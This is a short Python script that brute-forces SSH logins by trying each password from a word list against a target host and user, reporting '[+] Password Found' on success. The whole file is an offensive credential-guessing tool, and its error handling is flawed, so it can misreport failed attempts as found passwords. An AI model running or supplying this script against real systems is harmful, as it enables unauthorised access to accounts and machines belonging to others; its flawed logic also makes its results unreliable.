import pexpect
import click

PROMPT = ['# ', '>>> ', '> ', '\$ ']


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting? '
    connStr = 'ssh ' + str(user) + '@' + str(host)
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    child.sendline(password)
    child.expect(PROMPT, timeout=0.5)
    return child


@click.command()
@click.option('--host', prompt='Target IP Address', help='IP address of target machine')
@click.option('--user', prompt='User account', help='SSH user')
@click.option('--password', help='Password lists file', default='passwords.txt')
def main(host, user, password):
    with open(password) as f:
        for password in f.readlines():
            password = password.strip('\n')
            try:
                child = connect(user, host, password)
                click.secho('[+] Password Found: ' + password, fg='green')
            except:
                click.secho('[-] Wrong Password ' + password, fg='red')


if __name__ == '__main__':
    main()
